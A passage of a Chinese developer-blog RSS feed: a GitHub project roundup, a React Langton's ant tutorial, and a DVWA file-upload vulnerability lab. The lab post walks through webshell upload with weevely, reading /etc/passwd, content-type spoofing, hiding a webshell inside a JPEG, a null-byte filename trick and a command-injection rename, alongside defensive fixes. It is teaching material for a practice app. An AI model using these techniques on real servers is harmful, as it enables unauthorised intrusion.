&lt;p&gt;26、&lt;a href=&quot;https://github.com/jlevy/the-art-of-command-line&quot;&gt;the-art-of-command-line&lt;/a&gt;：该项目是作者在 Linux 系统上工作时，发现的一些命令行使用技巧的总结。有些技巧非常基础，而另一些则相当复杂，甚至难懂。这篇文章并不长，但当你能够熟练掌握这里列出的所有技巧时，你就学会了很多关于命令行的东西了，它们会提高你在编程时的灵活性以及效率。&lt;a href=&quot;https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md&quot;&gt;中文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;27、&lt;a href=&quot;https://github.com/valentinxxx/nginxconfig.io&quot;&gt;nginxconfig.io&lt;/a&gt;：在线生成 Nginx 配置文件网站，&lt;a href=&quot;https://nginxconfig.io/&quot;&gt;在线尝试&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;28、&lt;a href=&quot;https://github.com/Swordfish90/cool-retro-term&quot;&gt;cool-retro-term&lt;/a&gt;：一个终端模拟器，模仿了老式阴极管屏幕的外观和视觉感觉，养眼、轻量且外观可调，支持 Linux、macOS。搭配上 Vim 或 Emacs，即刻获得与上个世纪 hackers 相同的编程体验&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/cool-retro-term.gif&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;开源书籍&quot;&gt;开源书籍&lt;/h4&gt;
&lt;p&gt;29、&lt;a href=&quot;https://github.com/xiaoweiChen/Cpp_Concurrency_In_Action&quot;&gt;Cpp_Concurrency_In_Action&lt;/a&gt;：《C++ Concurrency in Action》的中文翻译版（C++ 并发编程），&lt;a href=&quot;https://chenxiaowei.gitbooks.io/cpp_concurrency_in_action/&quot;&gt;在线阅读&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;30、&lt;a href=&quot;https://github.com/Vonng/ddia&quot;&gt;ddia&lt;/a&gt;：《Designing Data-Intensive Application》中文翻译版（设计数据密集型应用）&lt;/p&gt;
&lt;h4 id=&quot;机器学习&quot;&gt;机器学习&lt;/h4&gt;
&lt;p&gt;31、&lt;a href=&quot;https://github.com/kpzhang93/MTCNN_face_detection_alignment&quot;&gt;MTCNN_face_detection_alignment&lt;/a&gt;：人脸检测领域经典之作，出自 2016 年 ECCV 一篇&lt;a href=&quot;https://kpzhang93.github.io/MTCNN_face_detection_alignment/paper/spl.pdf&quot;&gt;论文&lt;/a&gt;。目前在工业应用中落地比较成功，很多公司检测模块运用 MTCNN 或者其加速版，MTCNN 将人脸检测和关键点检测通过一个模型作为 MultiTasks 的方式进行训练，inference 时候可同时得到人脸框信息和关键点信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/MTCNN_face_detection_alignment.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;32、&lt;a href=&quot;https://github.com/zeusees/FaceBoxes&quot;&gt;FaceBoxes&lt;/a&gt;：出自论文 &lt;a href=&quot;http://cn.arxiv.org/abs/1708.05234&quot;&gt;FaceBoxes: A CPU Real-time Face Detector with High Accuracy&lt;/a&gt;，是一种可以在 CPU 上实现实时检测的方法，而且精度不错。该项目是 Caffe 版本，步骤讲解清晰，可以快速复现。鉴于 FaceBoxes 的检测速度非常快，也可以作为一种生产落地的方法，并且现有速度仍有一定的优化空间&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/FaceBoxes.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;33、&lt;a href=&quot;https://github.com/mahyarnajibi/SSH&quot;&gt;SSH&lt;/a&gt;：该项目是 ICCV2017 论文 &lt;a href=&quot;https://arxiv.org/abs/1708.03979&quot;&gt;SSH:Single Stage Headless Face Detector&lt;/a&gt;&lt;br/&gt;作者自己开源的项目，算是官方开源项目，具有一定的权威性。SSH 也算是人脸检测中一个经典的方法，具有较高的精度和较快的速度。项目实现了论文中的很多细节，对复现过程也有详细的讲解，容易实现。美中不足的是论文中的 Pyramid 方式，该项目没有实现&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/SSH.jpeg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;34、&lt;a href=&quot;https://github.com/yxlijun/S3FD.pytorch&quot;&gt;S3FD.pytorch&lt;/a&gt;：该项目是论文 &lt;a href=&quot;https://arxiv.org/abs/1708.05237&quot;&gt;S3FD:Single Shot Scale-invariant Face Detector&lt;/a&gt; 的 pytorch 复现版本。S3FD 目前在 FDDB 的评测中排在前几位，属于精度较高的人脸检测方法。论文主要解决人脸尺度问题，进一步提升对小脸的检测&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/S3FD_pytorch.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;35、&lt;a href=&quot;https://github.com/SnailTyan/deep-learning-papers-translation&quot;&gt;deep-learning-papers-translation&lt;/a&gt;：主要内容是 CV 领域里一些论文的翻译，包括分类、检测、OCR和模型轻量化。不喜欢看英文原版论文的，可以关注该项目&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;换种方式阅读&quot;&gt;换种方式阅读&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;网站：&lt;/strong&gt; https://hellogithub.com&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;GitBook：&lt;/strong&gt; https://gitbook.hellogithub.com&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;声明&quot;&gt;声明&lt;/h2&gt;
&lt;p&gt;如果你发现了好玩、有意义的开源项目 &lt;a href=&quot;https://github.com/521xueweihan/HelloGitHub/issues/new&quot;&gt;点击这里&lt;/a&gt; 分享你觉得有意思的项目。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;欢迎转载，请注明出处和作者，同时保留声明。&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 27 Dec 2018 14:50:00 +0000</pubDate>
<dc:creator>削微寒</dc:creator>
<og:description>公告 欢迎</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xueweihan/p/10188005.html</dc:identifier>
</item>
<item>
<title>目前如此2018-12-27 - 我就是小代</title>
<link>http://www.cnblogs.com/wdlove/p/10187973.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wdlove/p/10187973.html</guid>
<description>&lt;p&gt;&amp;#13;
                                    &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;modal&quot;&gt;&lt;span aria-hidden=&quot;true&quot;&gt;×&lt;/span&gt;&lt;span class=&quot;sr-only&quot;&gt;Close&lt;/span&gt;&lt;/button&gt;&amp;#13;
                                    &lt;h4 class=&quot;modal-title&quot;&gt;&amp;#13;
                                        请完成人机识别验证&amp;#13;
                                    &lt;/h4&gt;&amp;#13;
                                &lt;/p&gt;
                                &lt;div class=&quot;modal-body&quot; readability=&quot;33&quot;&gt;
                                    
                                    &lt;p&gt;&amp;#13;
                                        &lt;span id=&quot;geetestLoading&quot;&gt; 验证码组件加载中,请稍后...&lt;/span&gt;&amp;#13;
                                    &lt;/p&gt;
                                &lt;/div&gt;
                            </description>
<pubDate>Thu, 27 Dec 2018 14:41:00 +0000</pubDate>
<dc:creator>我就是小代</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://passport.cnblogs.com/user/signin?ReturnUrl=https%3A%2F%2Fwww.cnblogs.com%2Fwdlove%2Fp%2F10187973.html&amp;AspxAutoDetectCookieSupport=1</dc:identifier>
</item>
<item>
<title>React 系列教程2：编写兰顿蚂蚁演示程序 - 叙帝利</title>
<link>http://www.cnblogs.com/nzbin/p/9243294.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/nzbin/p/9243294.html</guid>
<description>&lt;h2 id=&quot;简介&quot;&gt;简介&lt;/h2&gt;
&lt;p&gt;最早接触兰顿蚂蚁是在做参数化的时候，那时候只感觉好奇，以为是很复杂的东西。因无意中看到&lt;a href=&quot;https://github.com/thepeted/game-of-life-redux&quot;&gt;生命游戏&lt;/a&gt;的 React 实现，所以希望通过兰顿蚂蚁的例子再学习一下 React。&lt;/p&gt;
&lt;p&gt;兰顿蚂蚁的规则非常简单：&lt;/p&gt;
&lt;p&gt;如果蚂蚁位于白色方块，则向右旋转 90°，反转方块的颜色，然后向前移动一步。&lt;br/&gt;如果蚂蚁位于黑色方块，则向左旋转 90°，反转方块的颜色，然后向前移动一步。&lt;/p&gt;
&lt;p&gt;如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/999445/201812/999445-20181221224123846-1514960406.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;蚂蚁在前一百步有一定规律，之后陷入混沌，直到一万步之后将走出混沌形成一条高速公路。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/999445/201812/999445-20181221224151015-1364484123.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;兰顿蚂蚁和生命游戏都是元胞自动机的一种，关于兰顿蚂蚁的更多介绍可以看&lt;a href=&quot;https://en.wikipedia.org/wiki/Langton%27s_ant&quot;&gt;维基百科&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;开始编写程序&quot;&gt;开始编写程序&lt;/h2&gt;
&lt;p&gt;在本教程中，我主要还是说一下项目中的问题及难点，不会对整个项目做太详细的介绍，把代码粘贴一遍也没什么意义，大家可以自己摸索一遍，其中 Webpack 用了 4.0，顺便说一句，Webpack4.0 还是有不少坑的，项目在 GitHub 中有，遇到问题可以翻阅一下源代码&lt;/p&gt;
&lt;blockquote readability=&quot;0.88235294117647&quot;&gt;
&lt;p&gt;源码：&lt;a href=&quot;https://github.com/nzbin/langton-ant-redux&quot; class=&quot;uri&quot;&gt;https://github.com/nzbin/langton-ant-redux&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;先看一下最终效果的动图演示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/999445/201812/999445-20181226222248809-1993685123.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个项目可以说是 React + Redux 非常基础的练习。主要就是绘制网格，根据蚂蚁规则重绘网格。以下是项目目录：&lt;/p&gt;
&lt;pre class=&quot;plain&quot;&gt;
&lt;code&gt;src
├── actions
│    └── index.js
├── components
│    ├── app.js
│    ├── button.js
│    └── cell.js                    
├── containers                       
│    ├── board.js
│    ├── control.js
│    └── counter.js            
├── reducers
│    ├── index.js
│    ├── reducer_board.js
│    ├── reducer_generations.js
│    └── reducer_play_status.js          
└── index.js
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;蚂蚁法则的算法&quot;&gt;蚂蚁法则的算法&lt;/h2&gt;
&lt;p&gt;兰顿蚂蚁演示程序的关键就是蚂蚁规则的算法，其实算法也很简单，设置方向变量，模拟蚂蚁的前进线路即可。以下是逻辑代码：&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;// status: true -&amp;gt; black square
if (gameState[row][col].status) {
    gameState[row][col].status = false;
    // ant: turnLeft90 -&amp;gt; move forward 1 step
    switch (dir) {
        case 'T':
            ant['pos'] = [row, col - 1];
            ant['dir'] = 'L';
            break;
        case 'B':
            ant['pos'] = [row, col + 1];
            ant['dir'] = 'R';
            break;
        case 'L':
            ant['pos'] = [row + 1, col];
            ant['dir'] = 'B';
            break;
        case 'R':
            ant['pos'] = [row - 1, col];
            ant['dir'] = 'T';
            break;
        default:
    }
}
// status: false -&amp;gt; white square
else if (!gameState[row][col].status) {
    gameState[row][col].status = true;
    // ant: turnRight90 -&amp;gt; move forward 1 step
    switch (dir) {
        case 'T':
            ant['pos'] = [row, col + 1];
            ant['dir'] = 'R';
            break;
        case 'B':
            ant['pos'] = [row, col - 1];
            ant['dir'] = 'L';
            break;
        case 'L':
            ant['pos'] = [row - 1, col];
            ant['dir'] = 'T';
            break;
        case 'R':
            ant['pos'] = [row + 1, col];
            ant['dir'] = 'B';
            break;
        default:
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;布局&quot;&gt;布局&lt;/h2&gt;
&lt;p&gt;演示程序的网格如果只是写死的话就非常简单，但是为了有更好的体验，我做成了响应式，无论有多少网格，总能全部显示在屏幕上。看似很简单的问题，其实有很多可以学习的地方。&lt;/p&gt;
&lt;p&gt;制作响应式网格的方式有很多，比如结合媒体查询，百分比。为了效果更好一点，我选择了百分比。&lt;/p&gt;
&lt;p&gt;其次正方形网格也有多种方式实现，比如 vw 单位，百分比+padding。其中使用 vw 单位会有一个问题，就是它的相对父元素是视窗，所以网格总是全屏显示，比较恶心。最后使用了百分比+padding 的方式。细节方面还使用了 calc 运算。&lt;/p&gt;
&lt;p&gt;但是百分比计算的网格存在精度问题，适当放大尺寸可以解决。&lt;/p&gt;
&lt;blockquote readability=&quot;1.6393442622951&quot;&gt;
&lt;p&gt;查看在线 Demo：&lt;a href=&quot;https://nzbin.github.io/langton-ant-redux&quot; class=&quot;uri&quot;&gt;https://nzbin.github.io/langton-ant-redux&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;性能&quot;&gt;性能&lt;/h2&gt;
&lt;p&gt;因为我对 React 的研究不深，所以在这个项目中遇到了一些性能问题，绘制一个 100X100 的网格的话，在 FireFox 中明显感觉到卡顿（与我的机子也有关系），Chrome 表现还可以。&lt;/p&gt;
&lt;p&gt;其实用 canvas 做演示程序可能更好一些，同时跑多个蚂蚁也没有问题。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;因各种各样的原因，没想到这篇文章又拖了半年多才写完，与其说是教程，不如说是对兰顿蚂蚁的介绍，更惭愧的是文章内容不深，无法帮助更多的初学者。我不是 React 的拥泵，目前专注 Angular，所以关于 React 的译文以及简易教程就到此为止吧。&lt;/p&gt;
</description>
<pubDate>Thu, 27 Dec 2018 14:37:00 +0000</pubDate>
<dc:creator>叙帝利</dc:creator>
<og:description>简介 最早接触兰顿蚂蚁是在做参数化的时候，那时候只感觉好奇，以为是很复杂的东西。因无意中看到</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/nzbin/p/9243294.html</dc:identifier>
</item>
<item>
<title>DVWA 黑客攻防实战（五）文件上传漏洞 File Upload - JOJO_2046</title>
<link>http://www.cnblogs.com/jojo-feed/p/10173026.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jojo-feed/p/10173026.html</guid>
<description>&lt;p&gt;说起文件上传漏洞 ，可谓是印象深刻。有次公司的网站突然访问不到了，同事去服务器看了一下。所有 webroot 文件夹下的所有文件都被重命名成其他文件，比如 jsp 文件变成 jsp.s ，以致于路径映射不到 jsp 文件，同事怀疑是攻击者上传了个 webshell 文件然后进行批量重命名了。&lt;/p&gt;
&lt;p&gt;把后台的代码都找了一遍，后台代码也都有验证文件扩展名的，后面是发现一张普通的照片其实是代码来的，但也不知道为何能够执行。但看完这篇文章你就会明白了。 下面用 dvwa 来演示如何攻击和防御。&lt;/p&gt;

&lt;p&gt;用户界面是这样的，是一个简单的上传文件功能。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tuchuang001.com/images/2018/10/09/dvwa-file-upload-ui.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然而 Hacker 就上传一个 phpinfo.php 文件&lt;/p&gt;
&lt;pre class=&quot;php&quot;&gt;
&lt;code&gt;&amp;lt;?
phpinfo();
?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;。。。结果如下&lt;br/&gt;&lt;img src=&quot;https://www.tuchuang001.com/images/2018/10/09/dvwa-file-upload-success.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后打开链接 http://192.168.31.166:5678/hackable/uploads/phpinfo.php ，又看到熟悉的界面了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1409313/201812/1409313-20181225121001536-683777866.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Hacker 想用 webshell 的方式尝试一下。于是就用 Kali Linux 预装的 &lt;a href=&quot;https://github.com/epinna/weevely3&quot;&gt;weevely&lt;/a&gt; 工具生成一个 webshell 文件，这里的 123456 是密码，这个 webshell 要用密码登录的。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;weevely generate 123456 /root/webshell.php
Generated backdoor with password '123456' in '/root/webshell.php' of 1479 byte size.&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上传完文件后，登录&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;weevely http://192.168.31.166:5678/hackable/uploads/webshell.php 123456
weevely&amp;gt; ls&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;dvwa_email.png
webshell.php&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;www-data@56e69b5b67b6:/var/www/html/hackable/uploads $ cat /etc/passwd&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;就变成你的地盘我做主了。 再来看看低级代码。&lt;/p&gt;
&lt;pre class=&quot;php&quot;&gt;
&lt;code&gt;&amp;lt;?php
    
if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
    
    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;';
    }
    else {
        // Yes!
        echo &quot;&amp;lt;pre&amp;gt;{$target_path} succesfully uploaded!&amp;lt;/pre&amp;gt;&quot;;
    }
}
    
?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;为何会变成这样的呢？觉得主要是没有限制文件扩展名吧。&lt;/p&gt;

&lt;p&gt;而中级代码，&lt;strong&gt;多了文件类型和文件大小的限制&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;amp;&amp;amp;
        ( $uploaded_size &amp;lt; 100000 ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;';
        }
        else {
            // Yes!
            echo &quot;&amp;lt;pre&amp;gt;{$target_path} succesfully uploaded!&amp;lt;/pre&amp;gt;&quot;;
        }
    }
    else {
        // Invalid file
        echo '&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;';
    }
}

?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里代码看上去好像类型都判断了，应该是不能上传 php 代码了吧。 然而 Hacker 打开火狐浏览器的调试器（谷歌浏览器没有修改功能，用 brup suite 之类的抓包也可以的），找到对应请求后右键选择-&amp;gt; edit and resend 然后将头部的 content-type 改掉，再重发请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tuchuang001.com/images/2018/10/09/dvwa-file-upload-firefox-change-header.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;结果如下&lt;br/&gt;&lt;img src=&quot;https://www.tuchuang001.com/images/2018/10/09/dvwa-file-upload-firefox-result-1024x335.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;打开链接 http://192.168.31.166:5678/hackable/uploads/phpinfo.php ，依然能看到熟悉的界面。&lt;/p&gt;

&lt;p&gt;中级的代码有漏洞的原因是用 content-type 去判断文件类型了，如果用扩展名去判断还有问题吗？高级代码就是这样想的，代码如下&lt;/p&gt;
&lt;pre class=&quot;php&quot;&gt;
&lt;code&gt;&amp;lt;?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;amp;&amp;amp;
        ( $uploaded_size &amp;lt; 100000 ) &amp;amp;&amp;amp;
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;';
        }
        else {
            // Yes!
            echo &quot;&amp;lt;pre&amp;gt;{$target_path} succesfully uploaded!&amp;lt;/pre&amp;gt;&quot;;
        }
    }
    else {
        // Invalid file
        echo '&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;';
    }
}
?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我尝试过将 phpinfo.php 改成 phpinfo.php.png ，然而不成功，因为调用了 getimagesize 这个函数，如果不是图片文件就会返回 false。 但是如果这图片既是图片又是代码呢？ 有人能想到了吗？ 11年左右百度贴吧风靡一时&lt;strong&gt;&lt;a href=&quot;https://zh.moegirl.org/zh-hans/%E5%9B%BE%E7%A7%8D&quot;&gt;图种&lt;/a&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如这是大家老婆的图片&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tuchuang001.com/images/2018/10/09/4e962edd305bca02.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;保存下来，将扩展名改成 zip ，再解压(用命令行 unzip)。。。就有福利。&lt;/p&gt;
&lt;p&gt;为什么可以这样 因为比如文件有特定的 jpg 标识，如果用看图程序打开，只会去看有图片标识的那部分，如果用 zip 压缩文件打开，也只会看有 zip 标识的那部分，其他部分会忽略的。 所以它既是图片也是种子。因此。我们可以制作类似图种的东西去注入 webshell。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;windows &lt;code&gt;copy /b D:\gakki.jpg + D:\webshell.php D:\gakki.jpg&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;linux/unix &lt;code&gt;cat webshell.php &amp;gt;&amp;gt; gakki.jpg&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;所以我们可以制作一个 “图php&quot;&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;cat phpinfo.php &amp;gt;&amp;gt; gakki.jpg&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;只是上传后，重命名是个问题。&lt;/p&gt;
&lt;p&gt;php 5.4 之下还容易解决，因为那个版本就有个漏洞上传&lt;code&gt;gakki.php%00.jpg&lt;/code&gt;这种文件会当成&lt;code&gt;gakki.php&lt;/code&gt;来执行的，因为 c语言等语言是用 \0 判断字符符结束的，所以该会被服务器当成 gakki.php 执行。&lt;/p&gt;
&lt;p&gt;在 File Upload 页面没法重名了。。。找不到其他方法。唯有借助同一级别下的漏洞比如是&lt;a href=&quot;https://www.cnblogs.com/jojo-feed/p/10172770.html&quot;&gt;命令行注入漏洞&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tuchuang001.com/images/2018/10/09/dvma-rename-gakki.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后输入在 &lt;code&gt;|mv ../../gakki.jpg ../../gakki.php&lt;/code&gt; ，再访问文件，结果如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tuchuang001.com/images/2018/10/09/dvwa-file-upload-result-1024x611.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;不可能级别的代码有添加了这些&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;使用 &lt;code&gt;imagecreatefromjpeg&lt;/code&gt; 或 &lt;code&gt;imagecreatefrompng&lt;/code&gt; 去掉了不属于图片的部分&lt;/li&gt;
&lt;li&gt;为文件重命名成 随机字符串。因为如何上传的文件是 phpshell.php.rar ，Apache 不认识 rar 格式就会向前解析，文件就解析成 phpshell.php 了。&lt;/li&gt;
&lt;li&gt;用 anti-token 解决一些 CSRF 问题&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre class=&quot;php&quot;&gt;
&lt;code&gt;&amp;lt;?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Where are we going to be writing to?
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;amp;&amp;amp;        ( $uploaded_size &amp;lt; 100000 ) &amp;amp;&amp;amp;
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;amp;&amp;amp;
        getimagesize( $uploaded_tmp ) ) {

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
        if( $uploaded_type == 'image/jpeg' ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );
            imagejpeg( $img, $temp_file, 100);
        }
        else {
            $img = imagecreatefrompng( $uploaded_tmp );
            imagepng( $img, $temp_file, 9);
        }
        imagedestroy( $img );

        // Can we move the file to the web root from the temp folder?
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
            // Yes!
            echo &quot;&amp;lt;pre&amp;gt;&amp;lt;a href='${target_path}${target_file}'&amp;gt;${target_file}&amp;lt;/a&amp;gt; succesfully uploaded!&amp;lt;/pre&amp;gt;&quot;;
        }
        else {
            // No
            echo '&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;';
        }

        // Delete any temp files
        if( file_exists( $temp_file ) )
            unlink( $temp_file );
    }
    else {
        // Invalid file
        echo '&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也有其他手段防御文件上传漏洞（《白帽子讲web安全》）：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;设置文件目录不可以执行&lt;/li&gt;
&lt;li&gt;给文件服务器设置单独的域名，因为不同源的原因，请求会被浏览器拦截&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Thu, 27 Dec 2018 13:28:00 +0000</pubDate>
<dc:creator>JOJO_2046</dc:creator>
<og:description>说起文件上传漏洞 ，可谓是印象深刻。有次公司的网站突然访问不到了，同事去服务器看了一下。所有 webroot 文件夹下的所有文件都被重命名成其他文件，比如 jsp 文件变成 jsp.s ，以致于路径映</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jojo-feed/p/10173026.html</dc:identifier>
</item>
</channel>
</rss>